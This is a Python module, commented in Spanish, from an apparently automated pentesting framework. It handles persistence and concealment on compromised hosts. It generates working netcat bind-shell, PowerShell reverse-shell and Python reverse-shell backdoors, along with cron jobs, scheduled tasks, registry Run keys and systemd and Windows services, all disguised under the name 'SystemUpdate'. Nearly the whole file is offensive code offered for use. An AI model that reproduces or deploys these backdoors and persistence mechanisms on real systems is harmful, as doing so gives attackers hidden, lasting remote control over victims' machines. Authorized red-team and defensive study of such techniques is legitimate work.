"""
Módulo de Persistencia y Ocultación para Automatización de Pentesting
Incluye instalación de backdoors, modificación de GPO y scripts de inicio
"""

import subprocess
import json
import time
import os
from typing import Dict, List, Any, Optional
from pathlib import Path
from modules.logging_system import LoggingSystem

class PersistenceModule:
    """Módulo de persistencia y ocultación"""
    
    def __init__(self, config: Dict[str, Any], logger):
        self.config = config
        self.logger = logger
        self.persistence_config = config['persistence']
        self.logging_system = LoggingSystem(config, logger)
        
        # Resultados de persistencia
        self.results = {
            'backdoors': [],
            'scheduled_tasks': [],
            'registry_modifications': [],
            'startup_scripts': [],
            'service_installations': [],
            'gpo_modifications': []
        }
        
        # Archivos de evidencia
        self.evidence_dir = Path("evidence/persistence")
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
    
    def _run_command(self, command: List[str], timeout: int = 300) -> Dict[str, Any]:
        """Ejecutar comando y capturar salida"""
        try:
            self.logger.debug(f"🔧 Ejecutando: {' '.join(command)}")
            
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace'
            )
            
            self.logging_system.log_command(
                ' '.join(command),
                result.stdout + result.stderr,
                result.returncode,
                "PERSISTENCE"
            )
            
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'return_code': result.returncode,
                'success': result.returncode == 0,
                'background': False
            }
                
        except subprocess.TimeoutExpired:
            self.logger.error(f"⏰ Timeout ejecutando: {' '.join(command)}")
            return {'stdout': '', 'stderr': 'Timeout', 'return_code': -1, 'success': False, 'background': False}
        except Exception as e:
            self.logger.error(f"❌ Error ejecutando comando: {e}")
            return {'stdout': '', 'stderr': str(e), 'return_code': -1, 'success': False, 'background': False}
    
    def install_backdoors(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Instalar backdoors en sistemas comprometidos"""
        self.logger.info("🕳️ Instalando backdoors...")
        
        backdoors = []
        backdoor_ports = self.persistence_config.get('backdoor_ports', [4444, 5555, 6666])
        
        for system in compromised_systems:
            host = system['host']
            access_method = system.get('access_method', 'unknown')
            
            self.logger.info(f"🕳️ Instalando backdoor en {host}")
            
            # Backdoor netcat
            netcat_backdoor = self._install_netcat_backdoor(host, backdoor_ports[0])
            if netcat_backdoor:
                backdoors.append(netcat_backdoor)
            
            # Backdoor PowerShell
            powershell_backdoor = self._install_powershell_backdoor(host, backdoor_ports[1])
            if powershell_backdoor:
                backdoors.append(powershell_backdoor)
            
            # Backdoor Python
            python_backdoor = self._install_python_backdoor(host, backdoor_ports[2])
            if python_backdoor:
                backdoors.append(python_backdoor)
        
        self.results['backdoors'] = backdoors
        return backdoors
    
    def _install_netcat_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Instalar backdoor netcat"""
        try:
            backdoor_script = self.evidence_dir / f"netcat_backdoor_{host}.sh"
            with open(backdoor_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("while true; do\n")
                f.write(f"    nc -lvp {port} -e /bin/bash\n")
                f.write("    sleep 5\n")
                f.write("done &\n")
            
            backdoor_info = {
                'host': host,
                'type': 'netcat',
                'port': port,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "NETCAT_BACKDOOR", backdoor_info, "PERSISTENCE"
            )
            
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando backdoor netcat en {host}: {e}")
            return None
    
    def _install_powershell_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Instalar backdoor PowerShell"""
        try:
            backdoor_script = self.evidence_dir / f"powershell_backdoor_{host}.ps1"
            with open(backdoor_script, 'w') as f:
                f.write("# PowerShell Backdoor\n")
                f.write("$client = New-Object System.Net.Sockets.TcpClient\n")
                f.write(f"$client.Connect('{self.config['exploitation']['lhost']}', {port})\n")
                f.write("$stream = $client.GetStream()\n")
                f.write("$writer = New-Object System.IO.StreamWriter($stream)\n")
                f.write("$reader = New-Object System.IO.StreamReader($stream)\n")
                f.write("while($true) {\n")
                f.write("    $command = $reader.ReadLine()\n")
                f.write("    $output = Invoke-Expression $command\n")
                f.write("    $writer.WriteLine($output)\n")
                f.write("    $writer.Flush()\n")
                f.write("}\n")
            
            backdoor_info = {
                'host': host,
                'type': 'powershell',
                'port': port,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "POWERSHELL_BACKDOOR", backdoor_info, "PERSISTENCE"
            )
            
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando backdoor PowerShell en {host}: {e}")
            return None
    
    def _install_python_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Instalar backdoor Python"""
        try:
            backdoor_script = self.evidence_dir / f"python_backdoor_{host}.py"
            with open(backdoor_script, 'w') as f:
                f.write("#!/usr/bin/env python3\n")
                f.write("import socket, subprocess, os\n")
                f.write(f"s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
                f.write(f"s.connect(('{self.config['exploitation']['lhost']}', {port}))\n")
                f.write("while True:\n")
                f.write("    data = s.recv(1024)\n")
                f.write("    if data:\n")
                f.write("        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n")
                f.write("        output = proc.stdout.read() + proc.stderr.read()\n")
                f.write("        s.send(output)\n")
            
            backdoor_info = {
                'host': host,
                'type': 'python',
                'port': port,
                'script_path': str(backdoor_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "PYTHON_BACKDOOR", backdoor_info, "PERSISTENCE"
            )
            
            return backdoor_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando backdoor Python en {host}: {e}")
            return None
    
    def create_scheduled_tasks(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Crear tareas programadas para persistencia"""
        self.logger.info("⏰ Creando tareas programadas...")
        
        scheduled_tasks = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Tarea programada Windows
            windows_task = self._create_windows_scheduled_task(host)
            if windows_task:
                scheduled_tasks.append(windows_task)
            
            # Cron job Linux
            linux_cron = self._create_linux_cron_job(host)
            if linux_cron:
                scheduled_tasks.append(linux_cron)
        
        self.results['scheduled_tasks'] = scheduled_tasks
        return scheduled_tasks
    
    def _create_windows_scheduled_task(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear tarea programada en Windows"""
        try:
            task_script = self.evidence_dir / f"windows_task_{host}.ps1"
            with open(task_script, 'w') as f:
                f.write("# Crear tarea programada en Windows\n")
                f.write("$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\\temp\\backdoor.ps1'\n")
                f.write("$trigger = New-ScheduledTaskTrigger -AtStartup\n")
                f.write("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\n")
                f.write("Register-ScheduledTask -TaskName 'SystemUpdate' -Action $action -Trigger $trigger -Settings $settings\n")
            
            task_info = {
                'host': host,
                'type': 'windows_scheduled_task',
                'task_name': 'SystemUpdate',
                'script_path': str(task_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "WINDOWS_SCHEDULED_TASK", task_info, "PERSISTENCE"
            )
            
            return task_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando tarea programada en {host}: {e}")
            return None
    
    def _create_linux_cron_job(self, host: str) -> Optional[Dict[str, Any]]:
        """Crear cron job en Linux"""
        try:
            cron_script = self.evidence_dir / f"linux_cron_{host}.sh"
            with open(cron_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Agregar cron job para persistencia\n")
                f.write("echo '@reboot /tmp/backdoor.sh' | crontab -\n")
                f.write("echo '*/5 * * * * /tmp/backdoor.sh' | crontab -\n")
            
            cron_info = {
                'host': host,
                'type': 'linux_cron',
                'schedule': '@reboot y */5 * * * *',
                'script_path': str(cron_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "LINUX_CRON_JOB", cron_info, "PERSISTENCE"
            )
            
            return cron_info
            
        except Exception as e:
            self.logger.error(f"❌ Error creando cron job en {host}: {e}")
            return None
    
    def modify_registry(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Modificar registro de Windows para persistencia"""
        self.logger.info("📝 Modificando registro de Windows...")
        
        registry_modifications = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Modificación de registro
            registry_script = self.evidence_dir / f"registry_{host}.ps1"
            with open(registry_script, 'w') as f:
                f.write("# Modificaciones de registro para persistencia\n")
                f.write("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' -Value 'C:\\temp\\backdoor.ps1'\n")
                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemUpdate' -Value 'C:\\temp\\backdoor.ps1'\n")
                f.write("Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'SystemUpdate' -Value 'C:\\temp\\backdoor.ps1'\n")
            
            registry_info = {
                'host': host,
                'type': 'registry_modification',
                'keys_modified': [
                    'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
                ],
                'script_path': str(registry_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "REGISTRY_MODIFICATION", registry_info, "PERSISTENCE"
            )
            
            registry_modifications.append(registry_info)
        
        self.results['registry_modifications'] = registry_modifications
        return registry_modifications
    
    def install_services(self, compromised_systems: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Instalar servicios maliciosos"""
        self.logger.info("⚙️ Instalando servicios maliciosos...")
        
        services = []
        
        for system in compromised_systems:
            host = system['host']
            
            # Servicio Windows
            windows_service = self._install_windows_service(host)
            if windows_service:
                services.append(windows_service)
            
            # Servicio Linux
            linux_service = self._install_linux_service(host)
            if linux_service:
                services.append(linux_service)
        
        self.results['service_installations'] = services
        return services
    
    def _install_windows_service(self, host: str) -> Optional[Dict[str, Any]]:
        """Instalar servicio en Windows"""
        try:
            service_script = self.evidence_dir / f"windows_service_{host}.ps1"
            with open(service_script, 'w') as f:
                f.write("# Instalar servicio malicioso en Windows\n")
                f.write("New-Service -Name 'SystemUpdate' -BinaryPathName 'C:\\temp\\backdoor.exe' -StartupType Automatic\n")
                f.write("Start-Service -Name 'SystemUpdate'\n")
            
            service_info = {
                'host': host,
                'type': 'windows_service',
                'service_name': 'SystemUpdate',
                'binary_path': 'C:\\temp\\backdoor.exe',
                'startup_type': 'Automatic',
                'script_path': str(service_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "WINDOWS_SERVICE", service_info, "PERSISTENCE"
            )
            
            return service_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando servicio en {host}: {e}")
            return None
    
    def _install_linux_service(self, host: str) -> Optional[Dict[str, Any]]:
        """Instalar servicio en Linux"""
        try:
            service_script = self.evidence_dir / f"linux_service_{host}.sh"
            with open(service_script, 'w') as f:
                f.write("#!/bin/bash\n")
                f.write("# Instalar servicio malicioso en Linux\n")
                f.write("cat > /etc/systemd/system/systemupdate.service << EOF\n")
                f.write("[Unit]\n")
                f.write("Description=System Update Service\n")
                f.write("After=network.target\n")
                f.write("\n")
                f.write("[Service]\n")
                f.write("Type=simple\n")
                f.write("ExecStart=/tmp/backdoor.sh\n")
                f.write("Restart=always\n")
                f.write("\n")
                f.write("[Install]\n")
                f.write("WantedBy=multi-user.target\n")
                f.write("EOF\n")
                f.write("systemctl enable systemupdate.service\n")
                f.write("systemctl start systemupdate.service\n")
            
            service_info = {
                'host': host,
                'type': 'linux_service',
                'service_name': 'systemupdate',
                'service_file': '/etc/systemd/system/systemupdate.service',
                'script_path': str(service_script),
                'timestamp': time.time(),
                'success': True
            }
            
            self.logging_system.log_persistence(
                host, "LINUX_SERVICE", service_info, "PERSISTENCE"
            )
            
            return service_info
            
        except Exception as e:
            self.logger.error(f"❌ Error instalando servicio en {host}: {e}")
            return None
    
    def run(self) -> Dict[str, Any]:
        """Ejecutar módulo completo de persistencia"""
        self.logger.info("🚀 INICIANDO MÓDULO DE PERSISTENCIA")
        
        start_time = time.time()
        
        try:
            # Sistemas comprometidos de ejemplo (en un escenario real, vendrían del módulo anterior)
            compromised_systems = [
                {'host': '192.168.1.100', 'access_method': 'eternalblue'},
                {'host': '192.168.1.101', 'access_method': 'tomcat_manager'}
            ]
            
            # 1. Instalar backdoors
            backdoors = self.install_backdoors(compromised_systems)
            
            # 2. Crear tareas programadas
            scheduled_tasks = self.create_scheduled_tasks(compromised_systems)
            
            # 3. Modificar registro (solo Windows)
            registry_modifications = self.modify_registry(compromised_systems)
            
            # 4. Instalar servicios
            services = self.install_services(compromised_systems)
            
            # 5. Guardar evidencia
            self.logging_system.save_json_evidence(
                'persistence_results.json',
                self.results,
                'data'
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            self.logger.info(f"✅ PERSISTENCIA COMPLETADA en {duration:.2f} segundos")
            self.logger.info(f"📊 Resumen: {len(backdoors)} backdoors, {len(scheduled_tasks)} tareas programadas")
            
            return self.results
            
        except Exception as e:
            self.logger.error(f"❌ Error en módulo de persistencia: {e}")
            return self.results
